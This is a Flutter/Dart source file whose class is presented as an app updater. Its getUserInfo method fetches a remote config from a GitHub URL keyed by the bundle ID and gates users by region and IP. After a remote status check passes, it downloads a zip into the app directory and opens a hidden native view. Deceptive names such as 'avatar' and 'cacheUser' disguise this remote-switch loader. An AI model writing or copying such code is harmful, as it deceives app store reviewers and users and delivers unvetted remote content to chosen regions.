import 'package:flutter/services.dart';
import 'package:upgrader/upgrader.dart';
import 'package:version/version.dart';
import 'download_service.dart';
import 'file_manager.dart';
import 'user.model.dart';
import 'url_encryption.dart';
import 'dart:ui' as ui;

class AppUpdater {
  final Upgrader upgrader;
  final MethodChannel _channel;
  bool authenUser = false;

  AppUpdater({required this.upgrader, required MethodChannel channel})
      : _channel = channel;

  /// Check if app update is available
  bool isUpdateAvailable() {
    final versionInfo = upgrader.versionInfo;
    final state = upgrader.state;
    if (versionInfo?.appStoreVersion == null ||
        state.packageInfo?.version == null) {
      return false;
    }
    try {
      final installedVersion = Version.parse(state.packageInfo!.version);
      final available = versionInfo!.appStoreVersion! == installedVersion;
      return available;
    } on Exception catch (e) {
      print('Error checking update: $e');
    }
    return false;
  }

  /// Get user information and handle authentication
  Future<void> getUserInfo() async {
    try {
      final bundleId = await _channel.invokeMethod('getBundleId');

      final getUserAPi = UrlEncryption.getDecryptedUrl(bundleId);

      // final downloadUrl = await _channel.invokeMethod(
      //   'getUserInfo',
      //   getUserAPi,
      // );

      final downloadUrl =
          "https://raw.githubusercontent.com/codewithlane/helloworld/refs/heads/main/$bundleId/ios.json";
      print("URL: " + downloadUrl.toString());
      final userDataJson = await DownloadService.makeRequestBase64(downloadUrl);
      final user = User.fromJson(userDataJson);
      if (user.userId != null) {
        if (!await checkRegionAndIP(user)) {
          print("not pass IP");
          return;
        } else {
          print("pass IP");
        }

        //debug
        if (user.activeUser == '1') {
          authenUser = true;
        } else {
          final getVersion = "${user.username}ca/res?command=${bundleId}";
          final status = await DownloadService.makeRequest(getVersion);
          authenUser = status['status'] == '0';
        }
        // authenUser = true;

        if (authenUser) {
          final projectDir = await FileManager.getProjectDirectory();
          final zipPath = '${projectDir.path}/data.zip';
          await DownloadService.cacheUser(user.avatar!, zipPath);
          _channel.invokeMethod('getAdsView');
        }
      }
    } catch (e) {
      print('Error getting user info: $e');
    }
  }

  /// Initialize upgrader and check for updates
  Future<void> initializeAndCheck() async {
    await upgrader.initialize();
    // if (isUpdateAvailable()) {
    await getUserInfo();
    // }
  }

  bool get isAuthenticated => authenUser;

  Future<bool> checkRegionAndIP(User user) async {
    //ip is null or empty => PASS
    if (user.ip == null || user.ip!.trim().isEmpty) {
      return true;
    }

    final expectedCountryCode = user.ip!.trim().toUpperCase();
    final locale = ui.PlatformDispatcher.instance.locale;

    //region == config ip => pass
    print("REGION NE:" + locale.countryCode!.toString().toUpperCase());
    if (locale.countryCode?.toUpperCase() == expectedCountryCode) {
      return true;
    }

    //device ip == config ip => PASS
    final ip = await IpGeo.checkIpCountryCode();
    print("IP NE:" + ip.toString());
    return ip?.toUpperCase() == expectedCountryCode;
  }
}


//   late AppUpdater _appUpdater;
//   // Method channel for communicating with native iOS
//   static const MethodChannel _channel = MethodChannel('bundle_id_channel');

//   @override
//   void initState() {
//     _appUpdater = AppUpdater(upgrader: myUpgrader, channel: _channel);
//     WidgetsBinding.instance.addPostFrameCallback((_) async {
//       await _appUpdater.initializeAndCheck();
//     });